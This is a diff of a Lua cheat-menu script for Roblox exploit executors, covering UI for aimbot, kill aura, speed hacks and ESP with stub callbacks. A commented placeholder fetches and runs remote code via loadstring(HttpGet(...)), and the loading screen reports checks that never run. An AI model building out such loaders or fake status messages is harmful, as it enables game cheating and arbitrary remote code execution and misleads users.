-        Size = UDim2.new(1, 0, 1, 0),
-        BackgroundTransparency = 1,
-        Text = name,
-        Font = Enum.Font.GothamBold,
-        TextSize = 14,
-        TextColor3 = Colors.TEXT_PRIMARY,
-        AutoButtonColor = false
-    }, container)
-    
-    -- Arrow icon
-    local arrow = Create("TextLabel", {
-        Size = UDim2.new(0, 24, 1, 0),
-        Position = UDim2.new(1, -30, 0, 0),
-        BackgroundTransparency = 1,
-        Text = "→",
-        Font = Enum.Font.GothamBold,
-        TextSize = 16,
-        TextColor3 = Colors.ACCENT,
-        AutoButtonColor = false
-    }, container)
-    
-    container.MouseEnter:Connect(function()
-        TweenService:Create(container, TweenInfo.new(0.2), {
-            BackgroundColor3 = Colors.BG_HOVER
-        }):Play()
-        TweenService:Create(arrow, TweenInfo.new(0.2), {
-            Position = UDim2.new(1, -26, 0, 0)
-        }):Play()
-    end)
-    
-    container.MouseLeave:Connect(function()
-        TweenService:Create(container, TweenInfo.new(0.2), {
-            BackgroundColor3 = Colors.BG_CARD
-        }):Play()
-        TweenService:Create(arrow, TweenInfo.new(0.2), {
-            Position = UDim2.new(1, -30, 0, 0)
-        }):Play()
-    end)
-    
-    container.MouseButton1Click:Connect(function()
-        if showLoading ~= false then
-            -- Show mini loading effect
-            local originalText = label.Text
-            label.Text = "Loading..."
-            label.TextColor3 = Colors.ACCENT
-            
-            spawn(function()
-                task.wait(0.8)
-                label.Text = originalText
-                label.TextColor3 = Colors.TEXT_PRIMARY
-                if callback then
-                    pcall(callback)
-                end
-            end)
-        else
-            if callback then
-                pcall(callback)
-            end
         end
     end)
     
     return container
 end
 
-function Hub:AddLabel(tabName, text)
-    local tab = self.tabs[tabName]
-    if not tab then return nil end
-    
-    local label = Create("TextLabel", {
-        Size = UDim2.new(1, -8, 0, 24),
-        BackgroundTransparency = 1,
-        Text = text,
-        Font = Enum.Font.GothamBold,
-        TextSize = 13,
-        TextColor3 = Colors.TEXT_MUTED,
-        TextXAlignment = Enum.TextXAlignment.Left
-    }, tab.content)
-    
-    return label
-end
+-- ═══════════════════════════════════════════════════════════════
+-- ADD FEATURES
+-- ═══════════════════════════════════════════════════════════════
+local orderCounter = 0
 
-function Hub:AddSeparator(tabName)
-    local tab = self.tabs[tabName]
-    if not tab then return nil end
-    
-    local sep = Create("Frame", {
-        Size = UDim2.new(1, -16, 0, 1),
-        BackgroundColor3 = Colors.STROKE,
-        BackgroundTransparency = 0.5,
-        BorderSizePixel = 0
-    }, tab.content)
-    
-    return sep
-end
+CreateLabel("⚔️ COMBAT", orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("Melee Aimbot", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("Auto Steal Nearest", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("Kill Aura", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
 
-function Hub:Toggle()
-    self.isOpen = not self.isOpen
-    self.gui.Enabled = self.isOpen
-    
-    if self.isOpen then
-        -- Animate in
-        self.main.Size = UDim2.fromOffset(0, 0)
-        self.main.BackgroundTransparency = 1
-        self.blur.BackgroundTransparency = 1
-        
-        TweenService:Create(self.blur, TweenInfo.new(0.3), {
-            BackgroundTransparency = 0.6
-        }):Play()
-        
-        TweenService:Create(self.main, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-            Size = UDim2.fromOffset(520, 420),
-            BackgroundTransparency = 0
-        }):Play()
-    end
-end
+CreateSeparator(orderCounter)
+orderCounter = orderCounter + 1
+CreateLabel("💰 FARM", orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("Auto Farm", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("Auto Collect", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("Cash Multiplier", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateSlider("Multi Value", 1, 100, 2, function(val) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateButton("Teleport to Collect Zone", function() end, orderCounter)
+orderCounter = orderCounter + 1
+
+CreateSeparator(orderCounter)
+orderCounter = orderCounter + 1
+CreateLabel("🛒 SHOP", orderCounter)
+orderCounter = orderCounter + 1
+CreateButton("Buy All Upgrades", function() end, orderCounter)
+orderCounter = orderCounter + 1
+CreateButton("Unlock All Weapons", function() end, orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("Auto Buy Best", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+
+CreateSeparator(orderCounter)
+orderCounter = orderCounter + 1
+CreateLabel("🏃 MOVEMENT", orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("Speed Hack", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateSlider("Speed Value", 16, 500, 100, function(val) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("Infinite Jump", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("No Clip", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+
+CreateSeparator(orderCounter)
+orderCounter = orderCounter + 1
+CreateLabel("👁️ VISUALS", orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("ESP Players", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("ESP Items", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateSlider("ESP Distance", 50, 5000, 500, function(val) end, orderCounter)
+orderCounter = orderCounter + 1
+CreateToggle("Full Bright", false, function(state) end, orderCounter)
+orderCounter = orderCounter + 1
+
+CreateSeparator(orderCounter)
+orderCounter = orderCounter + 1
+CreateLabel("⚙️ MISC", orderCounter)
+orderCounter = orderCounter + 1
+CreateButton("Anti-AFK", function() end, orderCounter)
+orderCounter = orderCounter + 1
+CreateButton("Server Hop", function() end, orderCounter)
+orderCounter = orderCounter + 1
+CreateButton("Rejoin Server", function() end, orderCounter)
+orderCounter = orderCounter + 1
+CreateLabel("Keybind: RightShift", orderCounter)
 
 -- ═══════════════════════════════════════════════════════════════
--- DISCORD POPUP (Modified for Unknown Hub)
+-- LOADING ANIMATION & PROPER DESTRUCTION
 -- ═══════════════════════════════════════════════════════════════
-local function ShowDiscordPopup()
-    if config.__DiscordShown then return end
+spawn(function()
+    local steps = {
+        {p = 0.1, s = "Checking executor...", sub = "Verifying compatibility"},
+        {p = 0.2, s = "Loading configuration...", sub = "Reading saved settings"},
+        {p = 0.35, s = "Initializing modules...", sub = "Loading core systems"},
+        {p = 0.5, s = "Loading UI components...", sub = "Building interface"},
+        {p = 0.65, s = "Setting up features...", sub = "Preparing toggles & sliders"},
+        {p = 0.8, s = "Checking for updates...", sub = "Contacting server"},
+        {p = 0.95, s = "Finalizing...", sub = "Almost ready"},
+        {p = 1.0, s = "Complete!", sub = "Ready"},
+    }
     
-    local popup = Create("ScreenGui", {
-        Name = "UnknownHubDiscord",
-        IgnoreGuiInset = true,
-        ResetOnSpawn = false,
-        ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    }, playerGui)
-    
-    -- Overlay
-    local overlay = Create("Frame", {
-        Size = UDim2.fromScale(1, 1),
-        BackgroundColor3 = Colors.SHADOW,
-        BackgroundTransparency = 0.5,
-        BorderSizePixel = 0
-    }, popup)
-    
-    -- Card
-    local card = Create("Frame", {
-        Size = UDim2.fromOffset(380, 240),
-        Position = UDim2.fromScale(0.5, 0.5),
-        AnchorPoint = Vector2.new(0.5, 0.5),
-        BackgroundColor3 = Colors.BG_CARD,
-        BorderSizePixel = 0
-    }, popup)
-    AddCorner(card, 20)
-    AddStroke(card, Colors.ACCENT, 2, 0.3)
-    
-    -- Glow effect
-    local glow = Create("UIStroke", {
-        Thickness = 12,
-        Transparency = 0.9,
-        Color = Colors.ACCENT_GLOW,
-        LineJoinMode = Enum.LineJoinMode.Round
-    }, card)
-    
-    -- Title bar
-    local topBar = Create("Frame", {
-        Size = UDim2.new(1, 0, 0, 44),
-        BackgroundColor3 = Colors.BG_CARD_2,
-        BorderSizePixel = 0
-    }, card)
-    AddCorner(topBar, 20)
-    local topFix = Create("Frame", {
-        Size = UDim2.new(1, 0, 0, 20),
-        Position = UDim2.new(0, 0, 1, -20),
-        BackgroundColor3 = Colors.BG_CARD_2,
-        BorderSizePixel = 0
-    }, topBar)
-    
-    local title = Create("TextLabel", {
-        Size = UDim2.new(1, -60, 1, 0),
-        BackgroundTransparency = 1,
-        Text = "UNKNOWN HUB",
-        Font = Enum.Font.GothamBlack,
-        TextSize = 18,
-        TextColor3 = Colors.ACCENT
-    }, topBar)
-    AddGradient(title, 0, {Colors.ACCENT, Colors.TEXT_PRIMARY})
-    
-    -- Close button
-    local closeBtn = Create("TextButton", {
-        Size = UDim2.fromOffset(32, 32),
-        Position = UDim2.new(1, -40, 0.5, -16),
-        BackgroundColor3 = Colors.BG_CARD,
-        BorderSizePixel = 0,
-        Text = "✕",
-        Font = Enum.Font.GothamBold,
-        TextSize = 14,
-        TextColor3 = Colors.TEXT_SECONDARY,
-        AutoButtonColor = true
-    }, topBar)
-    AddCorner(closeBtn, 8)
-    AddStroke(closeBtn, Colors.STROKE, 1, 0.3)
-    
-    -- Body text
-    local body = Create("TextLabel", {
-        Size = UDim2.new(1, -40, 0, 80),
-        Position = UDim2.new(0, 20, 0, 56),
-        BackgroundTransparency = 1,
-        Text = "Join our Discord for:\n• Secret features & updates\n• Giveaways & rewards\n• Community support",
-        Font = Enum.Font.Gotham,
-        TextSize = 14,
-        TextColor3 = Colors.TEXT_SECONDARY,
-        TextXAlignment = Enum.TextXAlignment.Center,
-        TextWrapped = true
-    }, card)
-    
-    -- Copy button
-    local copyBtn = Create("TextButton", {
-        Size = UDim2.new(1, -40, 0, 42),
-        Position = UDim2.new(0, 20, 1, -72),
-        BackgroundColor3 = Colors.ACCENT,
-        BorderSizePixel = 0,
-        Text = "Copy Discord Invite",
-        Font = Enum.Font.GothamBlack,
-        TextSize = 15,
-        TextColor3 = Colors.BG_DARK,
-        AutoButtonColor = true
-    }, card)
-    AddCorner(copyBtn, 12)
-    
-    -- Link text
-    local linkText = Create("TextLabel", {
-        Size = UDim2.new(1, -40, 0, 20),
-        Position = UDim2.new(0, 20, 1, -26),
-        BackgroundTransparency = 1,
-        Text = "discord.gg/unknown-hub",
-        Font = Enum.Font.GothamBold,
-        TextSize = 12,
-        TextColor3 = Colors.TEXT_MUTED
-    }, card)
-    
-    -- Toast
-    local toast = Create("TextLabel", {
-        Size = UDim2.new(1, -40, 0, 20),
-        Position = UDim2.new(0, 20, 1, -50),
-        BackgroundTransparency = 1,
-        Text = "",
-        Font = Enum.Font.Gotham,
-        TextSize = 11,
-        TextColor3 = Colors.SUCCESS,
-        TextTransparency = 1
-    }, card)
-    
-    local DISCORD_LINK = "https://discord.gg/unknown-hub"
-    
-    local function copyClipboard(text)
-        if setclipboard and pcall(setclipboard, text) then return true end
-        if toclipboard and pcall(toclipboard, text) then return true end
-        if syn and syn.write_clipboard and pcall(syn.write_clipboard, text) then return true end
-        return false
+    for i, step in ipairs(steps) do
+        if not loadingOverlay or not loadingOverlay.Parent then break end
+        progressFill.Size = UDim2.fromScale(step.p, 1)
+        statusLabel.Text = step.s
+        loadingSub.Text = step.sub
+        task.wait(0.35)
     end
     
-    copyBtn.MouseButton1Click:Connect(function()
-        if copyClipboard(DISCORD_LINK) then
-            toast.Text = "✓ Copied to clipboard!"
-            toast.TextTransparency = 0
-            task.delay(2, function()
-                TweenService:Create(toast, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
-            end)
-        end
-    end)
-    
-    local function close()
-        config.__DiscordShown = true
-        SaveConfig()
-        TweenService:Create(overlay, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
-        TweenService:Create(card, TweenInfo.new(0.3), {
-            Size = UDim2.fromOffset(0, 0),
-            BackgroundTransparency = 1
-        }):Play()
-        task.delay(0.35, function()
-            popup:Destroy()
-        end)
-    end
-    
-    closeBtn.MouseButton1Click:Connect(close)
-    overlay.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            close()
-        end
-    end)
-    
-    -- Animate in
-    card.Size = UDim2.fromOffset(0, 0)
-    TweenService:Create(card, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-        Size = UDim2.fromOffset(380, 240)
-    }):Play()
-end
-
--- ═══════════════════════════════════════════════════════════════
--- FIRST RUN HANDLER
--- ═══════════════════════════════════════════════════════════════
-local function HandleFirstRun()
-    local needFirstRun = not CheckFirstRun()
-    if needFirstRun then
-        MarkFirstRun()
-        -- You can add first-run specific logic here
-        -- For example, loading additional scripts
-        task.delay(2, function()
-            pcall(function()
-                -- Add your first-run remote script here
-                -- loadstring(game:HttpGet("YOUR_FIRST_RUN_URL"))()
-            end)
-        end)
-    end
-end
-
--- ═══════════════════════════════════════════════════════════════
--- INITIALIZE EVERYTHING
--- ═══════════════════════════════════════════════════════════════
-local loadingScreen = LoadingScreen.new()
-
--- Simulate loading progress
-task.spawn(function()
-    loadingScreen:SetProgress(0.05, "Checking executor...")
     task.wait(0.3)
     
-    loadingScreen:AddProgress(0.1, "Executor: " .. executorName)
-    task.wait(0.2)
+    -- DISCONNECT the animation loop FIRST
+    if loadingConn then
+        loadingConn:Disconnect()
+        loadingConn = nil
+    end
     
-    loadingScreen:AddProgress(0.15, "Loading configuration...")
-    task.wait(0.25)
-    
-    loadingScreen:AddProgress(0.2, "Initializing modules...")
-    task.wait(0.2)
-    
-    loadingScreen:AddProgress(0.15, "Loading UI components...")
-    task.wait(0.2)
-    
-    loadingScreen:AddProgress(0.15, "Setting up features...")
-    task.wait(0.2)
-    
-    loadingScreen:AddProgress(0.1, "Checking for updates...")
-    task.wait(0.15)
-    
-    loadingScreen:AddProgress(0.05, "Finalizing...")
     task.wait(0.1)
     
-    loadingScreen:Complete()
-end)
-
-loadingScreen:OnComplete(function()
-    -- Handle first run
-    HandleFirstRun()
+    -- SIMPLY DESTROY the loading GUI - no fade needed, this guarantees removal
+    if loadingGui and loadingGui.Parent then
+        loadingGui:Destroy()
+    end
     
-    -- Create the hub
-    local hub = Hub.new()
+    -- Wait a tiny bit after destruction
+    task.wait(0.2)
     
-    -- ═══════════════════════════════════════════════════════════
-    -- ADD TABS AND FEATURES
-    -- ═══════════════════════════════════════════════════════════
-    
-    -- MAIN TAB
-    local mainTab = hub:AddTab("Main", "🏠")
-    hub:AddLabel(mainTab.name, "COMBAT")
-    hub:AddToggle(mainTab.name, "Melee Aimbot", false, function(state)
-        print("Melee Aimbot:", state)
-    end)
-    hub:AddToggle(mainTab.name, "Auto Steal Nearest", false, function(state)
-        print("Auto Steal Nearest:", state)
-    end)
-    hub:AddToggle(mainTab.name, "Kill Aura", false, function(state)
-        print("Kill Aura:", state)
-    end)
-    hub:AddSeparator(mainTab.name)
-    hub:AddLabel(mainTab.name, "MOVEMENT")
-    hub:AddToggle(mainTab.name, "Speed Hack", false, function(state)
-        print("Speed Hack:", state)
-    end)
-    hub:AddSlider(mainTab.name, "Speed Value", 16, 500, 100, function(value)
-        print("Speed Value:", value)
-    end)
-    hub:AddToggle(mainTab.name, "Infinite Jump", false, function(state)
-        print("Infinite Jump:", state)
-    end)
-    hub:AddToggle(mainTab.name, "No Clip", false, function(state)
-        print("No Clip:", state)
-    end)
-    hub:AddSeparator(mainTab.name)
-    hub:AddLabel(mainTab.name, "PLAYER")
-    hub:AddToggle(mainTab.name, "God Mode", false, function(state)
-        print("God Mode:", state)
-    end)
-    hub:AddToggle(mainTab.name, "Invisible", false, function(state)
-        print("Invisible:", state)
-    end)
-    hub:AddButton(mainTab.name, "Respawn", function()
-        print("Respawning...")
-    end)
-    
-    -- FARM TAB
-    local farmTab = hub:AddTab("Farm", "🌾")
-    hub:AddToggle(farmTab.name, "Auto Farm", false, function(state)
-        print("Auto Farm:", state)
-    end)
-    hub:AddToggle(farmTab.name, "Auto Collect", false, function(state)
-        print("Auto Collect:", state)
-    end)
-    hub:AddToggle(farmTab.name, "Auto Sell", false, function(state)
-        print("Auto Sell:", state)
-    end)
-    hub:AddSlider(farmTab.name, "Collect Radius", 10, 500, 100, function(value)
-        print("Collect Radius:", value)
-    end)
-    hub:AddSeparator(farmTab.name)
-    hub:AddToggle(farmTab.name, "Cash Multiplier", false, function(state)
-        print("Cash Multiplier:", state)
-    end)
-    hub:AddSlider(farmTab.name, "Multiplier Value", 1, 100, 2, function(value)
-        print("Multiplier Value:", value)
-    end)
-    hub:AddToggle(farmTab.name, "Auto Quest", false, function(state)
-        print("Auto Quest:", state)
-    end)
-    hub:AddButton(farmTab.name, "Teleport to Collect Zone", function()
-        print("Teleporting...")
-    end)
-    
-    -- SHOP TAB
-    local shopTab = hub:AddTab("Shop", "🛒")
-    hub:AddButton(shopTab.name, "Buy All Upgrades", function()
-        print("Buying all upgrades...")
-    end)
-    hub:AddButton(shopTab.name, "Max All Stats", function()
-        print("Maxing stats...")
-    end)
-    hub:AddToggle(shopTab.name, "Auto Buy Best", false, function(state)
-        print("Auto Buy Best:", state)
-    end)
-    hub:AddSeparator(shopTab.name)
-    hub:AddLabel(shopTab.name, "WEAPONS")
-    hub:AddButton(shopTab.name, "Unlock All Weapons", function()
-        print("Unlocking weapons...")
-    end)
-    hub:AddButton(shopTab.name, "Get Best Weapon", function()
-        print("Getting best weapon...")
-    end)
-    hub:AddSeparator(shopTab.name)
-    hub:AddLabel(shopTab.name, "ABILITIES")
-    hub:AddButton(shopTab.name, "Unlock All Abilities", function()
-        print("Unlocking abilities...")
-    end)
-    hub:AddButton(shopTab.name, "Max Abilities", function()
-        print("Maxing abilities...")
-    end)
-    
-    -- TELEPORT TAB
-    local tpTab = hub:AddTab("Teleport", "⚡")
-    hub:AddButton(tpTab.name, "Teleport to Spawn", function()
-        print("Teleporting to spawn...")
-    end)
-    hub:AddButton(tpTab.name, "Teleport to Collect Zone", function()
-        print("Teleporting to collect zone...")
-    end)
-    hub:AddButton(tpTab.name, "Teleport to Shop", function()
-        print("Teleporting to shop...")
-    end)
-    hub:AddButton(tpTab.name, "Teleport to PvP Arena", function()
-        print("Teleporting to PvP arena...")
-    end)
-    hub:AddSeparator(tpTab.name)
-    hub:AddToggle(tpTab.name, "Teleport to Nearest Player", false, function(state)
-        print("Teleport to Nearest Player:", state)
-    end)
-    hub:AddToggle(tpTab.name, "Teleport to Nearest Coin", false, function(state)
-        print("Teleport to Nearest Coin:", state)
-    end)
-    hub:AddButton(tpTab.name, "Random Teleport", function()
-        print("Random teleporting...")
-    end)
-    
-    -- VISUALS TAB
-    local visTab = hub:AddTab("Visuals", "👁")
-    hub:AddToggle(visTab.name, "ESP Players", false, function(state)
-        print("ESP Players:", state)
-    end)
-    hub:AddToggle(visTab.name, "ESP Items", false, function(state)
-        print("ESP Items:", state)
-    end)
-    hub:AddToggle(visTab.name, "ESP Coins", false, function(state)
-        print("ESP Coins:", state)
-    end)
-    hub:AddSeparator(visTab.name)
-    hub:AddToggle(visTab.name, "Chams", false, function(state)
-        print("Chams:", state)
-    end)
-    hub:AddToggle(visTab.name, "Tracers", false, function(state)
-        print("Tracers:", state)
-    end)
-    hub:AddSlider(visTab.name, "ESP Distance", 50, 5000, 500, function(value)
-        print("ESP Distance:", value)
-    end)
-    hub:AddSeparator(visTab.name)
-    hub:AddLabel(visTab.name, "MISC VISUALS")
-    hub:AddToggle(visTab.name, "Full Bright", false, function(state)
-        print("Full Bright:", state)
-    end)
-    hub:AddToggle(visTab.name, "No Fog", false, function(state)
-        print("No Fog:", state)
-    end)
-    
-    -- MISC TAB
-    local miscTab = hub:AddTab("Misc", "⚙")
-    hub:AddButton(miscTab.name, "Anti-AFK", function()
-        print("Anti-AFK enabled")
-    end)
-    hub:AddToggle(miscTab.name, "Auto Rejoin", false, function(state)
-        print("Auto Rejoin:", state)
-    end)
-    hub:AddSlider(miscTab.name, "Rejoin Delay", 5, 60, 10, function(value)
-        print("Rejoin Delay:", value)
-    end)
-    hub:AddSeparator(miscTab.name)
-    hub:AddButton(miscTab.name, "Server Hop", function()
-        print("Server hopping...")
-    end)
-    hub:AddButton(miscTab.name, "Rejoin Server", function()
-        print("Rejoining...")
-    end)
-    hub:AddSeparator(miscTab.name)
-    hub:AddLabel(miscTab.name, "SETTINGS")
-    hub:AddButton(miscTab.name, "Reset Config", function()
-        settings = {}
-        SaveConfig()
-        print("Config reset!")
-    end)
-    hub:AddButton(miscTab.name, "Save Config", function()
-        SaveConfig()
-        print("Config saved!")
-    end, false)
-    hub:AddLabel(miscTab.name, "Keybind: RightShift")
-    
-    -- CREDITS TAB
-    local credTab = hub:AddTab("Credits", "ℹ")
-    hub:AddLabel(credTab.name, "UNKNOWN HUB")
-    hub:AddLabel(credTab.name, "Version 1.0.0")
-    hub:AddSeparator(credTab.name)
-    hub:AddLabel(credTab.name, "Developer: Unknown")
-    hub:AddLabel(credTab.name, "Executor: " .. executorName)
-    hub:AddSeparator(credTab.name)
-    hub:AddButton(credTab.name, "Join Discord", function()
-        pcall(function()
-            if setclipboard then setclipboard("https://discord.gg/unknown-hub") end
-        end)
-        print("Discord link copied!")
-    end)
-    hub:AddButton(credTab.name, "Copy Hub Link", function()
-        pcall(function()
-            if setclipboard then setclipboard("https://raw.githubusercontent.com/unknown/unknown-hub/main/loader.lua") end
-        end)
-        print("Hub link copied!")
-    end)
-    
-    -- Select first tab
-    hub:SelectTab("Main")
-    
-    -- Show discord popup after a delay
-    task.delay(1, function()
+    -- Now show discord popup if needed
+    if not firstShownFlag then
         ShowDiscordPopup()
-    end)
+    end
     
-    -- Open hub
-    task.delay(0.5, function()
-        hub:Toggle()
-    end)
-    
-    -- Store hub globally for external access
-    _G.UnknownHub = hub
+    -- Then show the hub
+    task.wait(0.3)
+    hubMain.Visible = true
+    hubVisible = true
+    hubMinimized = false
 end)
 
--- ═══════════════════════════════════════════════════════════════
--- NOTIFICATION SYSTEM
--- ═══════════════════════════════════════════════════════════════
-local Notifications = {}
-
-function Notifications.Show(title, text, duration, color)
-    duration = duration or 3
-    color = color or Colors.ACCENT
-    
-    local notifGui = Create("ScreenGui", {
-        Name = "UnknownHubNotif_" .. tick(),
-        ResetOnSpawn = false,
-        ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    }, playerGui)
-    
-    local container = Create("Frame", {
-        Size = UDim2.new(0, 300, 0, 80),
-        Position = UDim2.new(1, 320, 1, -100),
-        BackgroundColor3 = Colors.BG_CARD,
-        BorderSizePixel = 0
-    }, notifGui)
-    AddCorner(container, 12)
-    AddStroke(container, color, 1, 0.5)
-    
-    -- Accent bar
-    Create("Frame", {
-        Size = UDim2.new(0, 4, 0.7, 0),
-        Position = UDim2.new(0, 4, 0.15, 0),
-        BackgroundColor3 = color,
-        BorderSizePixel = 0
-    }, container)
-    AddCorner(container, 2)
-    
-    local titleLbl = Create("TextLabel", {
-        Size = UDim2.new(1, -20, 0, 28),
-        Position = UDim2.new(0, 16, 0, 10),
-        BackgroundTransparency = 1,
-        Text = title,
-        Font = Enum.Font.GothamBold,
-        TextSize = 14,
-        TextColor3 = Colors.TEXT_PRIMARY,
-        TextXAlignment = Enum.TextXAlignment.Left
-    }, container)
-    
-    local textLbl = Create("TextLabel", {
-        Size = UDim2.new(1, -20, 0, 20),
-        Position = UDim2.new(0, 16, 0, 38),
-        BackgroundTransparency = 1,
-        Text = text,
-        Font = Enum.Font.Gotham,
-        TextSize = 12,
-        TextColor3 = Colors.TEXT_SECONDARY,
-        TextXAlignment = Enum.TextXAlignment.Left,
-        TextTruncate = Enum.TextTruncate.AtEnd
-    }, container)
-    
-    -- Progress bar
-    local progress = Create("Frame", {
-        Size = UDim2.new(1, 0, 0, 3),
-        Position = UDim2.new(0, 0, 1, -3),
-        BackgroundColor3 = color,
-        BorderSizePixel = 0
-    }, container)
-    
-    -- Animate in
-    TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-        Position = UDim2.new(1, -320, 1, -100)
-    }):Play()
-    
-    -- Progress animation
-    spawn(function()
-        local startTime = tick()
-        while tick() - startTime < duration do
-            local elapsed = tick() - startTime
-            local remaining = 1 - (elapsed / duration)
-            progress.Size = UDim2.new(remaining, 0, 0, 3)
-            task.wait(0.016)
-        end
-        
-        -- Animate out
-        TweenService:Create(container, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
-            Position = UDim2.new(1, 320, 1, -100),
-            BackgroundTransparency = 1
-        }):Play()
-        
-        task.delay(0.35, function()
-            notifGui:Destroy()
-        end)
-    end)
-end
-
--- Make notifications global
-_G.UnknownHubNotify = Notifications.Show
+_G.UnknownHub = {
+    Toggle = ToggleHub,
+    Minimize = MinimizeHub,
+    IsVisible = function() return hubVisible end
+}
 
 print("[Unknown Hub] Loaded successfully!")
-print("[Unknown Hub] Executor: " .. executorName)
 print("[Unknown Hub] Keybind: RightShift")
